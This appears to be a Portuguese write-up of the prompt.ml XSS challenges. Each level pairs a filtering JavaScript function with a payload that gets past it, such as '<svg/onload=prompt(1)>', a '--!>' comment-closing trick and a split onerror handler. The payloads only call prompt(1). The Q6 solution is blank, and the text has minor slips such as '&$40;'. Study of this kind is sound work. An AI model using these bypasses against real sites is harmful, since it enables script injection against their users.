# XSS - Writeup


## Questões

### Q0

#### Enunciado
```js
function escape(input) {
    // warm up
    // script should be executed without user interaction
    return '<input type="text" value="' + input + '">';
}        
```

#### Resolução
<details>
<summary>
Visualizar resolução
</summary>
O valor de entrada do usuário é apenas concatenado ao texto que compõe o HTML. Portanto, basta finalizarmos a tag HTML aberta anteriormente, e abrir uma nova tag `<script>`, ou outro codigo executável:

``` html
"> <svg/onload=prompt(1)>
```
</details>


### Q1

#### Enunciado
```js
function escape(input) {
    // tags stripping mechanism from ExtJS library
    // Ext.util.Format.stripTags
    var stripTagsRE = /<\/?[^>]+>/gi;
    input = input.replace(stripTagsRE, '');

    return '<article>' + input + '</article>';
}
```

#### Resolução
<details>
<summary>
Visualizar resolução
</summary>
Nessa questão são removidos todas as tags completas (por exemplo, `<elemento>`). Portanto, basta inserir uma tag incompleta, porém válida, como o svg inserido anteriormente:
``` txt
&lt;svg/onload=prompt(1)
```
</details>

### Q2

#### Enunciado
``` js
function escape(input) {
    //                      v-- frowny face
    input = input.replace(/[=(]/g, '');

    // ok seriously, disallows equal signs and open parenthesis
    return input;
}
```

#### Resolução
<details>
<summary>
Visualizar resolução
</summary>
Agora, por remover qualquer ocorrência de sinais igual "=" ou abertura de parênteses "(", não podemos usar atributos como "onload=..." ou comandos javascript como "prompt(..". A solução é enviar o caracter HTML `&$40;`, que representa a abertura de parenteses:

``` html
<svg><script>prompt&#40;1)</script>
```

OBS: é necessário a abertura de uma tag `<svg>` previamente, já que esta permite a execução de scripts internos.
</details>


### Q3

#### Enunciado
``` js
function escape(input) {
    // filter potential comment end delimiters
    input = input.replace(/->/g, '_');

    // comment the input to avoid script execution
    return '<!-- ' + input + ' -->';
}
```

#### Resolução
<details>
<summary>
Visualizar resolução
</summary>
Nesse problema, a entrada é comentada, e "qualquer" tentativa de fechamento do comentário html é substituida. Mais especificamente, a sequencia de caracteres `->`. A solução, portanto, é aproveitarmos do mecanismo interno dos navegadores que aceitam fechamentos de tag incorretas, incluindo, no nosso caso, a sequencia `--!>`. Portanto, basta que se use:
``` html
--!><svg/onload=prompt(1)>
```
</details>


### Q4
#### Enunciado
``` js
function escape(input) {
    // make sure the script belongs to own site
    // sample script: http://prompt.ml/js/test.js
    if (/^(?:https?:)?\/\/prompt\.ml\//i.test(decodeURIComponent(input))) {
        var script = document.createElement('script');
        script.src = input;
        return script.outerHTML;
    } else {
        return 'Invalid resource.';
    }
} 
```
#### Solucao
Nesse caso, infelizmente é necessário a utilização de um domínio externo.

### Q5

#### Enunciado
``` js
function escape(input) {
    // apply strict filter rules of level 0
    // filter ">" and event handlers
    input = input.replace(/>|on.+?=|focus/gi, '_');

    return '<input value="' + input + '" type="text">';
}
```

#### Resolução
<details>
<summary>
Visualizar resolução
</summary>
Nessa questão, ambos fechamento de tag `>` e event handlers são filtados. Entretanto, ambas verificações podem sofrer *bypass*, basta:
- Utilizarmos a tag já aberta
- Modificarmos para que a sequência filtrada (`on.+?=`) não funcione corretamente:
``` html
"type=image src onerror
="prompt(1)
```
</details>

### Q6

#### Enunciado
``` js
function escape(input) {
    // let's do a post redirection
    try {
        // pass in formURL#formDataJSON
        // e.g. http://httpbin.org/post#{"name":"Matt"}
        var segments = input.split('#');
        var formURL = segments[0];
        var formData = JSON.parse(segments[1]);

        var form = document.createElement('form');
        form.action = formURL;
        form.method = 'post';

        for (var i in formData) {
            var input = form.appendChild(document.createElement('input'));
            input.name = i;
            input.setAttribute('value', formData[i]);
        }

        return form.outerHTML + '                         \n\
<script>                                                  \n\
    // forbid javascript: or vbscript: and data: stuff    \n\
    if (!/script:|data:/i.test(document.forms[0].action)) \n\
        document.forms[0].submit();                       \n\
    else                                                  \n\
        document.write("Action forbidden.")               \n\
</script>                                                 \n\
        ';
    } catch (e) {
        return 'Invalid form data.';
    }
}
```

#### Resolução
<details>
<summary>
Visualizar resolução
</summary>

``` html

```
</details>
